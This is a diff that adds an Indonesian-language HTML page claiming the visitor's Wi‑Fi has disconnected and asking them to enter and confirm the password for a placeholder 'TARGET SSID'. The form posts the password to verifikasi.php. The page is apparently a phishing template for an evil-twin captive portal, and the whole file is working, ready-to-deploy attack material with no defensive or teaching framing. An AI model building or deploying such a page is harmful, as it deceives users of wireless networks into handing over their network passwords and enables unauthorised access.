@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Wi‑Fi</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .box {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+
+        p {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .ssid {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 10px;
+            background: #d32f2f;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #b71c1c;
+        }
+
+        .error {
+            color: red;
+            text-align: center;
+            display: none;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="box">
+        <h2>Wi‑Fi Terputus</h2>
+        <p>
+            Masukkan password Wi‑Fi
+            <span class="ssid">TARGET SSID</span>
+            untuk kembali terhubung.
+        </p>
+
+        <form action="verifikasi.php" method="POST" onsubmit="return validate()">
+            <input
+                type="password"
+                name="password"
+                id="pass1"
+                placeholder="Password Wi‑Fi"
+                required
+            >
+
+            <input
+                type="password"
+                id="pass2"
+                placeholder="Konfirmasi Password"
+                required
+            >
+
+            <div class="error" id="error">
+                Password tidak cocok!
+            </div>
+
+            <button type="submit">Hubungkan</button>
+        </form>
+    </div>
+
+    <script>
+        function validate() {
+            const p1 = document.getElementById('pass1').value;
+            const p2 = document.getElementById('pass2').value;
+            const err = document.getElementById('error');
+
+            if (p1 !== p2) {
+                err.style.display = 'block';
+                return false;
+            }
+
+            err.style.display = 'none';
+            return true;
+        }
+    </script>
+</body>
+</html>
